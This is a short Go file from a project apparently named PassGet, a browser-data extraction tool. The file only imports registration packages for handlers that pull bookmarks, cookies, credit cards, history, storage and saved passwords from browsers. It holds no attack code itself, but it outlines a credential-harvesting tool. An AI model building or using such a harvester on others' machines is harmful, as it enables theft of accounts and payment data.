// Package browserdata is responsible for initializing all the necessary
// components that handle different types of browser data extraction.
// This file, imports.go, is specifically used to import various data
// handler packages to ensure their initialization logic is executed.
// These imports are crucial as they trigger the `init()` functions
// within each package, which typically handle registration of their
// specific data handlers to a central registry.
package browserdata

import (
	_ "PassGet/modules/browser/browserdata/bookmark"
	_ "PassGet/modules/browser/browserdata/cookie"
	_ "PassGet/modules/browser/browserdata/creditcard"
	_ "PassGet/modules/browser/browserdata/download"
	_ "PassGet/modules/browser/browserdata/extension"
	_ "PassGet/modules/browser/browserdata/history"
	_ "PassGet/modules/browser/browserdata/localstorage"
	_ "PassGet/modules/browser/browserdata/password"
	_ "PassGet/modules/browser/browserdata/sessionstorage"
)
